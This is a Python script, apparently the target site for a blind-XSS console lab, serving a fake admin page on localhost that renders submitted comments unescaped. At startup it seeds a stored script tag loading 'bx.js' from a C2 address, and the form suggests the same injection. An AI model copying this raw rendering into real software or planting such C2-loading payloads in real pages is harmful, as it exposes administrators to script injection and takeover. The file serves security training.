#!/usr/bin/env python3
"""BXConsole 실습 대상 사이트 (:8000) — 저장형 싱크가 있는 가짜 관리자 페이지.

실행:  python3 lab/target.py
  홈+주입 폼 : http://127.0.0.1:8000/
  싱크(피해자): http://127.0.0.1:8000/admin       (?xfo=1 로 X-Frame-Options DENY)
  부가 페이지: /profile, /logs  (내비게이션 생존 시험용)
"""
import http.server, os, socketserver, urllib.parse

COMMENTS = []
C2 = os.environ.get("BX_C2_URL", "http://127.0.0.1:7700")   # C2 주소 단일화 (9000 잔재 방지)
# 시작 시 기본 페이로드 자동 시딩 — 재시작해도 싱크(/admin)가 비지 않음
COMMENTS.append(f'<script src="{C2}/bx.js"></script>')

def page(title, body):
    nav = ('<p><a href="/">홈</a> | <a href="/profile">프로필</a> | '
           '<a href="/logs">감사로그</a> | <a href="/admin">관리자(싱크)</a></p>')
    return f"""<!doctype html><meta charset=utf-8><title>{title}</title>
<style>body{{font-family:sans-serif;margin:24px}}textarea{{width:480px;height:80px}}
.c{{border-left:3px solid #ccc;padding-left:8px;margin:6px 0}}</style>
<h3>[테스트 사이트] {title}</h3>{nav}{body}"""

class Target(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _page(self, title, html, extra=None):
        html = page(title, html)
        self.send_response(200)
        if extra: self.send_header(*extra)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(html.encode())))
        self.end_headers(); self.wfile.write(html.encode())

    def do_GET(self):
        u = urllib.parse.urlparse(self.path); p, q = u.path, urllib.parse.parse_qs(u.query)
        xfo = q.get("xfo", ["0"])[0] == "1"
        if p == "/admin":
            lst = "".join(f'<div class="c">{c}</div><hr>' for c in COMMENTS) or "<i>검토 대기 없음</i>"
            note = "XFO DENY" if xfo else "XFO 없음"
            self._page("관리자 검토 페이지 (싱크)",
                       lst + f"<p style='color:#888'>victim 페이지 — 저장 페이로드 실행 지점 ({note})</p>",
                       ("X-Frame-Options", "DENY") if xfo else None)
        elif p == "/profile": self._page("프로필", "<p>사용자: 테스트관리자 (role=admin)</p>")
        elif p == "/logs":    self._page("감사로그", "<pre>login ok / admin view / report ...</pre>")
        else:
            self._page("홈 (주입 폼)", f"""
<form method="POST" action="/submit">
<textarea name="comment" placeholder='여기에 &lt;script src="{C2}/bx.js"&gt;&lt;/script&gt; 입력'></textarea><br>
<button>제출 (검토 대기로 저장)</button></form>
<p>제출 후 <a href="/admin"><b>/admin</b></a> 열면 raw 렌더 → 페이로드 실행 (blind XSS 발동)</p>
<p>XFO 폴백 시험: <a href="/admin?xfo=1">/admin?xfo=1</a></p>""")

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        d = urllib.parse.parse_qs(self.rfile.read(n).decode())
        COMMENTS.append(d.get("comment", [""])[0])
        self.send_response(303); self.send_header("Location", "/admin"); self.end_headers()

class S(socketserver.ThreadingMixIn, http.server.HTTPServer): daemon_threads = True

if __name__ == "__main__":
    print("BXConsole 실습 대상 :8000  | 주입 폼: / | 싱크: /admin")
    S(("127.0.0.1", 8000), Target).serve_forever()
